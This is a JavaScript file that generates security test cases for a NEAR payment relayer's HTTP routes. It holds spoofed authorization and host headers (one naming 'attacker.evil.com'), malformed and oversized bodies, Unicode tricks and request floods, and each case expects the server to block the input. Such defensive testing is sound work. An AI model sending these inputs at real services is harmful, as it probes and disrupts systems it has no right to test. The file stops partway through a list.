// Layer B Extension Cases (Facilitator HTTP Server)
// Conforms to web/docs/RENCANA_ATTACK_2500.md and .agy/BRIEF_BACKEND.md
// Provides >= 200 parametric test cases covering Categories 5, 7, 8, 9, 12

const TGAS = 10n ** 12n;
const U64_MAX = (1n << 64n) - 1n;
const U128_MAX = (1n << 128n) - 1n;

/**
 * Builds deeply nested JSON string
 * @param {number} depth
 */
function buildDeeplyNestedJson(depth = 200) {
  let s = '{"v":1}';
  for (let i = 0; i < depth; i++) {
    s = `{"n":${s}}`;
  }
  return s;
}

/**
 * Builds large JSON string with exact target byte length
 * @param {number} targetBytes
 */
function buildLargeJsonPayload(targetBytes) {
  const base = '{"signed_delegate":"abc","filler":"';
  const suffix = '"}';
  const fillerLen = Math.max(0, targetBytes - base.length - suffix.length);
  return base + 'x'.repeat(fillerLen) + suffix;
}

// =============================================================================
// CATEGORY 5: Akses dan Identitas HTTP (50 kasus: KAT-B-05-101 .. KAT-B-05-150)
// =============================================================================

function generateCategory5Extra() {
  const cases = [];

  // 1. HTTP Verb Variations on /relay (12 cases)
  const relayVerbs = [
    { verb: 'GET', code: 'METHOD_NOT_ALLOWED' },
    { verb: 'PUT', code: 'METHOD_NOT_ALLOWED' },
    { verb: 'DELETE', code: 'METHOD_NOT_ALLOWED' },
    { verb: 'PATCH', code: 'METHOD_NOT_ALLOWED' },
    { verb: 'HEAD', code: 'METHOD_NOT_ALLOWED' },
    { verb: 'OPTIONS', code: 'METHOD_NOT_ALLOWED' },
    { verb: 'TRACE', code: 'METHOD_NOT_ALLOWED' },
    { verb: 'MKCOL', code: 'METHOD_NOT_ALLOWED' },
    // Raw-socket verbs with non-canonical casing: llhttp (server side) rejects the
    // method token with HPE_INVALID_METHOD before the router, hence HTTP_400.
    { verb: 'post', code: 'HTTP_400', raw: true }, // lowercase
    { verb: 'Post', code: 'HTTP_400', raw: true }, // titlecase
    { verb: 'pOsT', code: 'HTTP_400', raw: true }, // mixed case
    { verb: 'POSTS', code: 'NOT_FOUND' }, // wrong route
  ];

  relayVerbs.forEach((item, i) => {
    const num = 101 + i;
    const isPostSubpath = item.verb === 'POSTS';
    cases.push({
      id: `KAT-B-05-${num}`,
      category: 5,
      layer: 'B',
      title: `HTTP method verb variation '${item.verb}' to ${isPostSubpath ? '/relay/' : '/relay'}`,
      params: {
        method: isPostSubpath ? 'POST' : item.verb,
        path: isPostSubpath ? '/relays' : '/relay',
        clientIp: `10.5.1.${num}`,
        body: '{"signed_delegate":"dummy"}',
        rawRequest: item.raw === true,
      },
      expected: {
        label: 'BLOCKED',
        code: item.code,
      },
    });
  });

  // 2. HTTP Verb Variations on other facilitator routes (12 cases)
  const routeVerbs = [
    { path: '/verify', verb: 'GET', code: 'METHOD_NOT_ALLOWED' },
    { path: '/verify', verb: 'PUT', code: 'METHOD_NOT_ALLOWED' },
    { path: '/verify', verb: 'DELETE', code: 'METHOD_NOT_ALLOWED' },
    { path: '/verify', verb: 'PATCH', code: 'METHOD_NOT_ALLOWED' },
    { path: '/settle', verb: 'GET', code: 'METHOD_NOT_ALLOWED' },
    { path: '/settle', verb: 'PUT', code: 'METHOD_NOT_ALLOWED' },
    { path: '/settle', verb: 'DELETE', code: 'METHOD_NOT_ALLOWED' },
    { path: '/settle', verb: 'PATCH', code: 'METHOD_NOT_ALLOWED' },
    { path: '/health', verb: 'POST', code: 'METHOD_NOT_ALLOWED' },
    { path: '/health', verb: 'DELETE', code: 'METHOD_NOT_ALLOWED' },
    { path: '/supported', verb: 'POST', code: 'METHOD_NOT_ALLOWED' },
    { path: '/metrics', verb: 'POST', code: 'METHOD_NOT_ALLOWED' },
  ];

  routeVerbs.forEach((item, i) => {
    const num = 113 + i;
    cases.push({
      id: `KAT-B-05-${num}`,
      category: 5,
      layer: 'B',
      title: `Disallowed verb '${item.verb}' against route ${item.path}`,
      params: {
        method: item.verb,
        path: item.path,
        clientIp: `10.5.1.${num}`,
        body: '{"signed_delegate":"dummy"}',
      },
      expected: {
        label: 'BLOCKED',
        code: item.code,
      },
    });
  });

  // 3. Spoofed and Chained Headers (14 cases)
  const headerVariations = [
    {
      title: 'Chained X-Forwarded-For with 5 hops (proxy trust)',
      headers: { 'x-forwarded-for': '192.168.1.1, 10.0.0.1, 172.16.0.1, 203.0.113.195, 10.5.2.1' },
      expectedCode: 'BAD_ENCODING',
    },
    {
      title: 'Chained X-Forwarded-For with trailing commas and whitespace',
      headers: { 'x-forwarded-for': '10.0.0.1, 10.0.0.2 , 10.5.2.2 ' },
      expectedCode: 'BAD_ENCODING',
    },
    {
      title: 'Spoofed Authorization Bearer token (unused by delegate auth)',
      headers: { authorization: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummy.sig' },
      expectedCode: 'BAD_ENCODING',
    },
    {
      title: 'Spoofed Authorization Basic auth (unused by delegate auth)',
      headers: { authorization: 'Basic YWRtaW46cGFzc3dvcmQ=' },
      expectedCode: 'BAD_ENCODING',
    },
    {
      title: 'Spoofed Authorization AWS4-HMAC-SHA256 signature',
      headers: { authorization: 'AWS4-HMAC-SHA256 Credential=AKIAIOSFODNN7EXAMPLE/20261030/us-east-1/s3/aws4_request' },
      expectedCode: 'BAD_ENCODING',
    },
    {
      title: 'Spoofed Host header pointing to arbitrary external domain',
      headers: { host: 'attacker.evil.com:8080' },
      expectedCode: 'BAD_ENCODING',
    },
    {
      title: 'Spoofed X-Forwarded-Host header',
      headers: { 'x-forwarded-host': 'phishing.amanat.org' },
      expectedCode: 'BAD_ENCODING',
    },
    {
      title: 'Spoofed X-Forwarded-Proto header set to http',
      headers: { 'x-forwarded-proto': 'http' },
      expectedCode: 'BAD_ENCODING',
    },
    {
      title: 'Spoofed X-Real-IP header',
      headers: { 'x-real-ip': '1.2.3.4' },
      expectedCode: 'BAD_ENCODING',
    },
    {
      title: 'X-Request-ID with UUID format',
      headers: { 'x-request-id': 'e3b0c442-98fc-1c14-9afb-f4c8996fb924' },
      expectedCode: 'BAD_ENCODING',
    },
    {
      title: 'X-Request-ID containing punctuation and special symbols',
      headers: { 'x-request-id': 'req-test@#%*()_+=~' },
      expectedCode: 'BAD_ENCODING',
    },
    {
      title: 'X-Request-ID containing URL-encoded Unicode characters',
      headers: { 'x-request-id': 'req-id-amanat-%E2%9A%A1-2026' },
      expectedCode: 'BAD_ENCODING',
    },
    {
      title: 'Duplicate client identification headers',
      headers: { 'client-version': '1.0.0', 'x-client-version': '2.0.0' },
      expectedCode: 'BAD_ENCODING',
    },
    {
      title: 'Custom security bypass attempt header (X-Bypass-Rate-Limit: true)',
      headers: { 'x-bypass-rate-limit': 'true', 'x-internal-admin': '1' },
      expectedCode: 'BAD_ENCODING',
    },
  ];

  headerVariations.forEach((item, i) => {
    const num = 125 + i;
    cases.push({
      id: `KAT-B-05-${num}`,
      category: 5,
      layer: 'B',
      title: item.title,
      params: {
        method: 'POST',
        path: '/relay',
        clientIp: `10.5.2.${num}`,
        headers: item.headers,
        body: '{"signed_delegate":""}',
      },
      expected: {
        label: 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  // 4. Agent and Mandate Account Identity / Type Confusion (12 cases)
  const identityVariations = [
    {
      title: 'Sender is empty string in delegate',
      delegate: { senderId: '', nonce: 511n },
      expectedCode: 'AGENT_NOT_ALLOWED',
    },
    {
      title: 'Sender is system account with leading dot (.near)',
      delegate: { senderId: '.near', nonce: 512n },
      expectedCode: 'AGENT_NOT_ALLOWED',
    },
    {
      title: 'Sender is system account with double dot (agent..testnet)',
      delegate: { senderId: 'agent..testnet', nonce: 513n },
      expectedCode: 'AGENT_NOT_ALLOWED',
    },
    {
      title: 'Sender contains uppercase letters (AGENT1.testnet)',
      delegate: { senderId: 'AGENT1.testnet', nonce: 514n },
      expectedCode: 'AGENT_NOT_ALLOWED',
    },
    {
      title: 'Receiver is foreign token contract (usdc.testnet instead of amanat.testnet)',
      delegate: { receiverId: 'usdc.testnet', nonce: 515n },
      expectedCode: 'WRONG_RECEIVER',
    },
    {
      title: 'Receiver is relayer itself (relayer.testnet)',
      delegate: { receiverId: 'relayer.testnet', nonce: 516n },
      expectedCode: 'WRONG_RECEIVER',
    },
    {
      title: 'Receiver contains uppercase characters (AMANAT.testnet)',
      delegate: { receiverId: 'AMANAT.testnet', nonce: 517n },
      expectedCode: 'WRONG_RECEIVER',
    },
    {
      title: 'Method name in function call is uppercase (REQUEST_PAYMENT)',
      delegate: { rawActionMethod: 'REQUEST_PAYMENT', nonce: 518n },
      expectedCode: 'METHOD_NOT_ALLOWED',
    },
    {
      title: 'Method name is mixed case (Request_Payment)',
      delegate: { rawActionMethod: 'Request_Payment', nonce: 519n },
      expectedCode: 'METHOD_NOT_ALLOWED',
    },
    {
      title: 'Method name has trailing null byte (request_payment\\0)',
      delegate: { rawActionMethod: 'request_payment\0', nonce: 520n },
      expectedCode: 'METHOD_NOT_ALLOWED',
    },
    {
      title: 'Method name is storage deposit call (storage_deposit)',
      delegate: { rawActionMethod: 'storage_deposit', nonce: 521n },
      expectedCode: 'METHOD_NOT_ALLOWED',
    },
    {
      title: 'Method name is ft_transfer call on delegate',
      delegate: { rawActionMethod: 'ft_transfer', nonce: 522n },
      expectedCode: 'METHOD_NOT_ALLOWED',
    },
  ];

  identityVariations.forEach((item, i) => {
    const num = 139 + i;
    cases.push({
      id: `KAT-B-05-${num}`,
      category: 5,
      layer: 'B',
      title: item.title,
      params: {
        method: 'POST',
        path: '/relay',
        clientIp: `10.5.3.${num}`,
        delegate: item.delegate,
      },
      expected: {
        label: 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  return cases;
}

// =============================================================================
// CATEGORY 7: Gas dan Sumber Daya (45 kasus: KAT-B-07-101 .. KAT-B-07-145)
// =============================================================================

function generateCategory7Extra() {
  const cases = [];

  // 1. Gas Boundaries around 60 Tgas and 100 Tgas (24 cases)
  const gasVariations = [
    { title: 'Gas 0 units (minimum 60 Tgas)', gas: 0n, expectedCode: 'GAS_TOO_LOW' },
    { title: 'Gas 1 unit', gas: 1n, expectedCode: 'GAS_TOO_LOW' },
    { title: 'Gas 1 Tgas (1,000,000,000,000)', gas: TGAS, expectedCode: 'GAS_TOO_LOW' },
    { title: 'Gas 10 Tgas', gas: 10n * TGAS, expectedCode: 'GAS_TOO_LOW' },
    { title: 'Gas 25 Tgas', gas: 25n * TGAS, expectedCode: 'GAS_TOO_LOW' },
    { title: 'Gas 45 Tgas', gas: 45n * TGAS, expectedCode: 'GAS_TOO_LOW' },
    { title: 'Gas 50 Tgas', gas: 50n * TGAS, expectedCode: 'GAS_TOO_LOW' },
    { title: 'Gas 55 Tgas', gas: 55n * TGAS, expectedCode: 'GAS_TOO_LOW' },
    { title: 'Gas 58 Tgas', gas: 58n * TGAS, expectedCode: 'GAS_TOO_LOW' },
    { title: 'Gas 59 Tgas', gas: 59n * TGAS, expectedCode: 'GAS_TOO_LOW' },
    { title: 'Gas 59.9 Tgas (59,900,000,000,000)', gas: 599n * (TGAS / 10n), expectedCode: 'GAS_TOO_LOW' },
    { title: 'Gas exactly 1 unit below minGas (59.999... Tgas)', gas: 60n * TGAS - 1n, expectedCode: 'GAS_TOO_LOW' },
    { title: 'Gas 60 Tgas exact with unallowed agent (passes gas boundary)', gas: 60n * TGAS, senderId: 'unauth.testnet', expectedCode: 'AGENT_NOT_ALLOWED' },
    { title: 'Gas 61 Tgas with unallowed agent', gas: 61n * TGAS, senderId: 'unauth.testnet', expectedCode: 'AGENT_NOT_ALLOWED' },
    { title: 'Gas 75 Tgas with unallowed agent', gas: 75n * TGAS, senderId: 'unauth.testnet', expectedCode: 'AGENT_NOT_ALLOWED' },
    { title: 'Gas 90 Tgas with unallowed agent', gas: 90n * TGAS, senderId: 'unauth.testnet', expectedCode: 'AGENT_NOT_ALLOWED' },
    { title: 'Gas 100 Tgas exact with unallowed agent (policy maxGas)', gas: 100n * TGAS, senderId: 'unauth.testnet', expectedCode: 'AGENT_NOT_ALLOWED' },
    { title: 'Gas exactly 1 unit above maxGas (100.000...1 Tgas)', gas: 100n * TGAS + 1n, expectedCode: 'GAS_TOO_HIGH' },
    { title: 'Gas 101 Tgas', gas: 101n * TGAS, expectedCode: 'GAS_TOO_HIGH' },
    { title: 'Gas 120 Tgas', gas: 120n * TGAS, expectedCode: 'GAS_TOO_HIGH' },
    { title: 'Gas 150 Tgas', gas: 150n * TGAS, expectedCode: 'GAS_TOO_HIGH' },
    { title: 'Gas 250 Tgas', gas: 250n * TGAS, expectedCode: 'GAS_TOO_HIGH' },
    { title: 'Gas 300 Tgas (max NEAR block gas limit)', gas: 300n * TGAS, expectedCode: 'GAS_TOO_HIGH' },
    { title: 'Gas u64::MAX value', gas: U64_MAX, expectedCode: 'GAS_TOO_HIGH' },
  ];

  gasVariations.forEach((item, i) => {
    const num = 101 + i;
    cases.push({
      id: `KAT-B-07-${num}`,
      category: 7,
      layer: 'B',
      title: item.title,
      params: {
        method: 'POST',
        path: '/relay',
        clientIp: `10.7.1.${num}`,
        delegate: {
          gas: item.gas,
          senderId: item.senderId ?? 'agent1.testnet',
          nonce: BigInt(700 + num),
        },
      },
      expected: {
        label: 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  // 2. Numeric Boundaries in request_payment Call Arguments (15 cases)
  const argVariations = [
    { title: 'Call arg amount is negative integer string ("-100")', rawActionArgs: { mandate_id: 1, recipient: 'bob.testnet', amount: '-100', nonce: 1 }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg amount is float decimal string ("100.5")', rawActionArgs: { mandate_id: 1, recipient: 'bob.testnet', amount: '100.5', nonce: 1 }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg amount is scientific notation ("1e18")', rawActionArgs: { mandate_id: 1, recipient: 'bob.testnet', amount: '1e18', nonce: 1 }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg amount is hexadecimal ("0x1000")', rawActionArgs: { mandate_id: 1, recipient: 'bob.testnet', amount: '0x1000', nonce: 1 }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg amount has leading space (" 100")', rawActionArgs: { mandate_id: 1, recipient: 'bob.testnet', amount: ' 100', nonce: 1 }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg amount has trailing space ("100 ")', rawActionArgs: { mandate_id: 1, recipient: 'bob.testnet', amount: '100 ', nonce: 1 }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg amount exceeds u128::MAX', rawActionArgs: { mandate_id: 1, recipient: 'bob.testnet', amount: (U128_MAX + 1n).toString(), nonce: 1 }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg amount is non-numeric string ("one_near")', rawActionArgs: { mandate_id: 1, recipient: 'bob.testnet', amount: 'one_near', nonce: 1 }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg mandate_id is negative (-5)', rawActionArgs: { mandate_id: -5, recipient: 'bob.testnet', amount: '100', nonce: 1 }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg mandate_id is decimal string ("1.5")', rawActionArgs: { mandate_id: '1.5', recipient: 'bob.testnet', amount: '100', nonce: 1 }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg mandate_id exceeds u64::MAX', rawActionArgs: { mandate_id: (U64_MAX + 1n).toString(), recipient: 'bob.testnet', amount: '100', nonce: 1 }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg nonce is negative (-1)', rawActionArgs: { mandate_id: 1, recipient: 'bob.testnet', amount: '100', nonce: -1 }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg nonce is decimal string ("2.5")', rawActionArgs: { mandate_id: 1, recipient: 'bob.testnet', amount: '100', nonce: '2.5' }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg nonce exceeds u64::MAX', rawActionArgs: { mandate_id: 1, recipient: 'bob.testnet', amount: '100', nonce: (U64_MAX + 1n).toString() }, expectedCode: 'BAD_CALL_ARGS' },
    { title: 'Call arg recipient is empty string', rawActionArgs: { mandate_id: 1, recipient: '', amount: '100', nonce: 1 }, expectedCode: 'BAD_CALL_ARGS' },
  ];

  argVariations.forEach((item, i) => {
    const num = 125 + i;
    cases.push({
      id: `KAT-B-07-${num}`,
      category: 7,
      layer: 'B',
      title: item.title,
      params: {
        method: 'POST',
        path: '/relay',
        clientIp: `10.7.2.${num}`,
        delegate: {
          rawActionMethod: 'request_payment',
          rawActionArgs: item.rawActionArgs,
          nonce: BigInt(700 + num),
        },
      },
      expected: {
        label: 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  // 3. Sequential and Concurrent Burst Handling (6 cases)
  const burstVariations = [
    { title: 'Sequential burst of 10 requests from distinct IP (capacity 20)', floodCount: 10, path: '/relay', expectedCode: 'BAD_ENCODING', expectedLabel: 'BLOCKED' },
    { title: 'Sequential burst of 15 requests from distinct IP', floodCount: 15, path: '/relay', expectedCode: 'BAD_ENCODING', expectedLabel: 'BLOCKED' },
    { title: 'Concurrent burst of 5 parallel requests to /relay', concurrentFlood: 5, path: '/relay', expectedCode: 'BAD_ENCODING', expectedLabel: 'BLOCKED' },
    { title: 'Concurrent burst of 12 parallel requests to /relay', concurrentFlood: 12, path: '/relay', expectedCode: 'BAD_ENCODING', expectedLabel: 'BLOCKED' },
    { title: 'Sequential burst of 8 GET requests to /health', floodCount: 8, path: '/health', method: 'GET', expectedLabel: 'INERT' },
    { title: 'Sequential burst of 8 GET requests to /supported', floodCount: 8, path: '/supported', method: 'GET', expectedLabel: 'INERT' },
  ];

  burstVariations.forEach((item, i) => {
    const num = 140 + i;
    cases.push({
      id: `KAT-B-07-${num}`,
      category: 7,
      layer: 'B',
      title: item.title,
      params: {
        method: item.method || 'POST',
        path: item.path,
        clientIp: `10.7.3.${num}`,
        floodCount: item.floodCount,
        concurrentFlood: item.concurrentFlood,
        body: item.method === 'GET' ? null : '{"signed_delegate":""}',
      },
      expected: {
        label: item.expectedLabel,
        code: item.expectedCode,
      },
    });
  });

  return cases;
}

// =============================================================================
// CATEGORY 8: Format HTTP dan Parsing (60 kasus: KAT-B-08-101 .. KAT-B-08-160)
// =============================================================================

function generateCategory8Extra() {
  const cases = [];

  // 1. Content-Type Header Variations (13 cases)
  const ctVariations = [
    { title: 'Missing Content-Type header on POST /relay', omitContentType: true, expectedCode: 'UNSUPPORTED_MEDIA_TYPE' },
    { title: 'Content-Type text/plain on POST /relay', ct: 'text/plain', expectedCode: 'UNSUPPORTED_MEDIA_TYPE' },
    { title: 'Content-Type text/html on POST /relay', ct: 'text/html', expectedCode: 'UNSUPPORTED_MEDIA_TYPE' },
    { title: 'Content-Type application/xml on POST /relay', ct: 'application/xml', expectedCode: 'UNSUPPORTED_MEDIA_TYPE' },
    { title: 'Content-Type application/x-www-form-urlencoded', ct: 'application/x-www-form-urlencoded', expectedCode: 'UNSUPPORTED_MEDIA_TYPE' },
    { title: 'Content-Type multipart/form-data; boundary=something', ct: 'multipart/form-data; boundary=something', expectedCode: 'UNSUPPORTED_MEDIA_TYPE' },
    { title: 'Content-Type image/png on POST /relay', ct: 'image/png', expectedCode: 'UNSUPPORTED_MEDIA_TYPE' },
    { title: 'Content-Type application/octet-stream', ct: 'application/octet-stream', expectedCode: 'UNSUPPORTED_MEDIA_TYPE' },
    { title: 'Content-Type application/jsonx (invalid extension)', ct: 'application/jsonx', expectedCode: 'UNSUPPORTED_MEDIA_TYPE' },
    { title: 'Content-Type application/json; charset=utf-8 (valid charset, empty body)', ct: 'application/json; charset=utf-8', expectedCode: 'BAD_ENCODING' },
    { title: 'Content-Type APPLICATION/JSON uppercase (case-insensitive check)', ct: 'APPLICATION/JSON', expectedCode: 'BAD_ENCODING' },
    { title: 'Content-Type application/json; boundary=none', ct: 'application/json; boundary=none', expectedCode: 'BAD_ENCODING' },
    { title: 'Missing Content-Type on POST /verify', path: '/verify', omitContentType: true, expectedCode: 'MISSING_PAYMENT_SIGNATURE' },
  ];

  ctVariations.forEach((item, i) => {
    const num = 101 + i;
    const headers = {};
    if (item.ct) headers['content-type'] = item.ct;
    cases.push({
      id: `KAT-B-08-${num}`,
      category: 8,
      layer: 'B',
      title: item.title,
      params: {
        method: 'POST',
        path: item.path || '/relay',
        clientIp: `10.8.1.${num}`,
        headers,
        omitContentType: item.omitContentType,
        body: '{"signed_delegate":""}',
      },
      expected: {
        label: 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  // 2. Malformed Body and Syntax Variations (28 cases)
  const bodyVariations = [
    { title: 'Empty string body', body: '', expectedCode: 'BAD_JSON' },
    { title: 'Whitespace-only body', body: '   \t\n   ', expectedCode: 'BAD_JSON' },
    { title: 'Literal JSON null body', body: 'null', expectedCode: 'BAD_REQUEST' },
    { title: 'Literal JSON boolean true body', body: 'true', expectedCode: 'BAD_REQUEST' },
    { title: 'Literal JSON boolean false body', body: 'false', expectedCode: 'BAD_REQUEST' },
    { title: 'Literal JSON integer number body (12345)', body: '12345', expectedCode: 'BAD_REQUEST' },
    { title: 'Literal JSON negative float number body (-99.9)', body: '-99.9', expectedCode: 'BAD_REQUEST' },
    { title: 'Literal JSON string body ("hello world")', body: '"hello world"', expectedCode: 'BAD_REQUEST' },
    { title: 'JSON empty array body ([])', body: '[]', expectedCode: 'BAD_REQUEST' },
    { title: 'JSON array with numbers body ([1, 2, 3])', body: '[1, 2, 3]', expectedCode: 'BAD_REQUEST' },
    { title: 'JSON array containing delegate object ([{"signed_delegate": "..."}])', body: '[{"signed_delegate": "abc"}]', expectedCode: 'BAD_REQUEST' },
    { title: 'JSON empty object body ({})', body: '{}', expectedCode: 'BAD_REQUEST' },
    { title: 'JSON object with irrelevant fields ({"unrelated": 1})', body: '{"unrelated": 1}', expectedCode: 'BAD_REQUEST' },
    { title: 'JSON signed_delegate is null', body: '{"signed_delegate": null}', expectedCode: 'BAD_REQUEST' },
    { title: 'JSON signed_delegate is number', body: '{"signed_delegate": 12345}', expectedCode: 'BAD_REQUEST' },
    { title: 'JSON signed_delegate is boolean', body: '{"signed_delegate": true}', expectedCode: 'BAD_REQUEST' },
    { title: 'JSON signed_delegate is array', body: '{"signed_delegate": ["a", "b"]}', expectedCode: 'BAD_REQUEST' },
    { title: 'JSON signed_delegate is object', body: '{"signed_delegate": {"key": "val"}}', expectedCode: 'BAD_REQUEST' },
    { title: 'Malformed JSON missing closing bracket', body: '{"signed_delegate": "abc"', expectedCode: 'BAD_JSON' },
    { title: 'Malformed JSON unquoted property name', body: '{signed_delegate: "abc"}', expectedCode: 'BAD_JSON' },
    { title: 'Malformed JSON single-quoted string values', body: "{'signed_delegate': 'abc'}", expectedCode: 'BAD_JSON' },
    { title: 'Malformed JSON trailing comma in object', body: '{"signed_delegate": "abc",}', expectedCode: 'BAD_JSON' },
    { title: 'Malformed JSON literal undefined', body: 'undefined', expectedCode: 'BAD_JSON' },
    { title: 'Malformed JSON literal NaN', body: 'NaN', expectedCode: 'BAD_JSON' },
    { title: 'Malformed JSON leading commas', body: '[,{"signed_delegate": "abc"}]', expectedCode: 'BAD_JSON' },
    { title: 'JSON with duplicate signed_delegate key (last wins, invalid b64)', body: '{"signed_delegate":"abc","signed_delegate":"xyz"}', expectedCode: 'BAD_ENCODING' },
    { title: 'Deeply nested JSON object structure (100 levels)', body: buildDeeplyNestedJson(100), expectedCode: 'BAD_REQUEST' },
    { title: 'Deeply nested JSON object structure (300 levels)', body: buildDeeplyNestedJson(300), expectedCode: 'BAD_REQUEST' },
  ];

  bodyVariations.forEach((item, i) => {
    const num = 114 + i;
    cases.push({
      id: `KAT-B-08-${num}`,
      category: 8,
      layer: 'B',
      title: item.title,
      params: {
        method: 'POST',
        path: '/relay',
        clientIp: `10.8.2.${num}`,
        body: item.body,
      },
      expected: {
        label: 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  // 3. Payload Size, Unicode, Null-Byte, and Binary Variations (19 cases)
  const payloadVariations = [
    { title: 'JSON signed_delegate with embedded null byte (\\u0000)', body: '{"signed_delegate": "abc\\u0000def"}', expectedCode: 'BAD_ENCODING' },
    { title: 'JSON body containing emoji unicode characters (🚀🔥🛡️)', body: '{"signed_delegate": "🚀🔥🛡️"}', expectedCode: 'BAD_ENCODING' },
    { title: 'JSON body containing RTL override unicode (\\u202E)', body: '{"signed_delegate": "abc\\u202Edef"}', expectedCode: 'BAD_ENCODING' },
    { title: 'JSON body containing zero-width space unicode (\\u200B)', body: '{"signed_delegate": "abc\\u200Bdef"}', expectedCode: 'BAD_ENCODING' },
    { title: 'JSON body containing UTF-8 Byte Order Mark (\\uFEFF)', body: '\uFEFF{"signed_delegate": "abc"}', expectedCode: 'BAD_JSON' },
    { title: 'Raw Buffer with null byte (0x00)', body: Buffer.from('{"signed_delegate":"\0"}'), expectedCode: 'BAD_JSON' },
    { title: 'Raw binary random bytes (Buffer of 64 bytes)', body: Buffer.alloc(64, 0xab), expectedCode: 'BAD_JSON' },
    { title: 'Non-UTF8 byte sequence (0xff, 0xfe, 0xfd)', body: Buffer.from([0xff, 0xfe, 0xfd]), expectedCode: 'BAD_JSON' },
    { title: 'Single byte body ("{")', body: '{', expectedCode: 'BAD_JSON' },
    { title: 'Small valid JSON body (32 bytes)', body: '{"signed_delegate":"not_base64"}', expectedCode: 'BAD_ENCODING' },
    { title: 'Medium sized body (1024 bytes)', body: buildLargeJsonPayload(1024), expectedCode: 'BAD_ENCODING' },
    { title: 'Body 4096 bytes (4KB)', body: buildLargeJsonPayload(4096), expectedCode: 'BAD_ENCODING' },
    { title: 'Body 8192 bytes (8KB)', body: buildLargeJsonPayload(8192), expectedCode: 'BAD_ENCODING' },
    { title: 'Body exactly at boundary 16384 bytes (16KB limit)', body: buildLargeJsonPayload(16384), expectedCode: 'BAD_ENCODING' },
    { title: 'Body exceeding boundary 16385 bytes (16KB + 1B -> 413 BODY_TOO_LARGE)', body: buildLargeJsonPayload(16385), expectedCode: 'BODY_TOO_LARGE' },
    { title: 'Body 20KB exceeding max body size', body: buildLargeJsonPayload(20480), expectedCode: 'BODY_TOO_LARGE' },
    { title: 'Body 32KB exceeding max body size', body: buildLargeJsonPayload(32768), expectedCode: 'BODY_TOO_LARGE' },
    { title: 'Content-Length header specifies 99999 (triggers BODY_TOO_LARGE header check)', body: '{"signed_delegate":"abc"}', headers: { 'content-length': '99999' }, expectedCode: 'BODY_TOO_LARGE' },
    { title: 'Chunked transfer-encoding with broken chunks', body: 'invalid_chunk_format', headers: { 'transfer-encoding': 'chunked' }, omitContentLength: true, expectedCode: 'BAD_JSON' },
  ];

  payloadVariations.forEach((item, i) => {
    const num = 142 + i;
    cases.push({
      id: `KAT-B-08-${num}`,
      category: 8,
      layer: 'B',
      title: item.title,
      params: {
        method: 'POST',
        path: '/relay',
        clientIp: `10.8.3.${num}`,
        body: item.body,
        headers: item.headers,
        omitContentLength: item.omitContentLength,
      },
      expected: {
        label: 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  return cases;
}

// =============================================================================
// CATEGORY 9: Fasilitator Operasional HTTP (50 kasus: KAT-B-09-101 .. KAT-B-09-150)
// =============================================================================

function generateCategory9Extra() {
  const cases = [];

  // 1. IP Rate Limiter Flooding (5 cases)
  const floodIps = [
    { title: 'Flood burst of 25 requests to /relay (triggers IP_RATE_LIMITED)', path: '/relay', ip: '198.51.100.101', method: 'POST', expectedCode: 'IP_RATE_LIMITED' },
    { title: 'Flood burst of 25 requests to /verify (triggers IP_RATE_LIMITED)', path: '/verify', ip: '198.51.100.102', method: 'POST', expectedCode: 'IP_RATE_LIMITED' },
    { title: 'Flood burst of 25 requests to /settle (triggers IP_RATE_LIMITED)', path: '/settle', ip: '198.51.100.103', method: 'POST', expectedCode: 'IP_RATE_LIMITED' },
    { title: 'Flood burst of 25 requests to /status/:hash (triggers IP_RATE_LIMITED)', path: '/status/dummy_hash_1', ip: '198.51.100.104', method: 'GET', expectedCode: 'IP_RATE_LIMITED' },
    { title: 'Flood burst of 30 requests to /relay (exhausts tokens)', path: '/relay', ip: '198.51.100.105', method: 'POST', expectedCode: 'IP_RATE_LIMITED' },
  ];

  floodIps.forEach((item, i) => {
    const num = 101 + i;
    cases.push({
      id: `KAT-B-09-${num}`,
      category: 9,
      layer: 'B',
      title: item.title,
      params: {
        method: item.method,
        path: item.path,
        clientIp: item.ip,
        floodCount: 25,
        body: item.method === 'POST' ? '{"signed_delegate":"invalid"}' : null,
      },
      expected: {
        label: 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  // 2. Queue Saturation and Concurrency Stress (5 cases)
  const queueVariations = [
    { title: 'High concurrency burst on /relay under queue saturation', concurrentFlood: 20, expectedCode: 'BAD_ENCODING' },
    { title: 'High concurrency burst on /verify route', path: '/verify', concurrentFlood: 15, expectedCode: 'MISSING_PAYMENT_SIGNATURE' },
    { title: 'High concurrency burst on /settle route', path: '/settle', concurrentFlood: 15, expectedCode: 'MISSING_PAYMENT_SIGNATURE' },
    { title: 'Rapid requests from single client on /relay', floodCount: 18, expectedCode: 'BAD_ENCODING' },
    { title: 'Concurrent requests with empty delegate payload', concurrentFlood: 10, expectedCode: 'BAD_ENCODING' },
  ];

  queueVariations.forEach((item, i) => {
    const num = 106 + i;
    cases.push({
      id: `KAT-B-09-${num}`,
      category: 9,
      layer: 'B',
      title: item.title,
      params: {
        method: 'POST',
        path: item.path || '/relay',
        clientIp: `10.9.1.${num}`,
        concurrentFlood: item.concurrentFlood,
        floodCount: item.floodCount,
        body: '{"signed_delegate":""}',
      },
      expected: {
        label: 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  // 3. /status/:hash Route Variations (10 cases)
  const statusVariations = [
